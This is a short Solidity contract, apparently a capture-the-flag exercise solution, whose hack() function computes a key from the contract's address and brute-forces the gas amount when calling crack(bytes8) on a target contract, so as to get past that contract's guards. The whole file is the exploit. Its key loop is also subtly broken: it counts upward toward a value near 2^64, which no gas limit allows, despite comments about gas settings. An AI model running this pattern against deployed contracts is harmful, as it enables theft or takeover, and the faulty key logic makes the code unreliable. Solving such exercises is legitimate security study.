pragma solidity ^0.8.0;

contract Sol5 {
    address public target;

    constructor(address target_) {
        target = target_;
    }
    
    // Remember to check the transaction GasLimit setting in Metamask.
    // It is suggest to be higher than 400000 if early break is applied.
    // It is suggest to be higher than 1000000 if early break is not applied.
    // Be careful for block maximum gas limit.
    function hack() public {
        bytes8 key;
        unchecked {
            // TODO: Implement the calculation of key value here.
            //       Noted the way to turn contract address into uint64 is uint64(uint160(address(this)))
            uint64 key2 = 0;
            while(uint64(uint160(address(this))) ^ key2 != uint64(0) - 1) {
                key2++;
            }
            key = bytes8(key2);
        }
        
        // TODO: Implement for looping gas fee here. 
        //// FOR LOOP gasfee for at least 22 times {
        for (uint256 gasfee = 0; gasfee < 22; gasfee++) {
            (bool success, ) = target.call{gas: gasfee + 30000}(
                abi.encodeWithSignature("crack(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
        //// }
    }
}